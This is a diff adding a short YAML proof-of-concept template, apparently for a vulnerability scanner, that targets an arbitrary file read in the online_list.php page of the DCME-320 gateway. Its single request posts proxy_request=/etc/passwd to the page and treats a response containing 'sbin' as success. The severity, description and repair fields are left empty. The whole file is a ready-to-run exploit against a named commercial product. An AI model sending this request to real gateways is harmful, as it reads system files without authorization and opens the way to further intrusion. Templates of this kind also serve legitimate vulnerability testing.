@@ -1,0 +1,25 @@
+id:
+
+info:
+  name: 神州数码DCME-320出口网关 online_list.php 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /function/auth/user/online_list.php
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+  data: |
+    proxy_request=/etc/passwd
+response1:
+  headers:
+  body: sbin
+  code: 200
+requests2:
+response2:
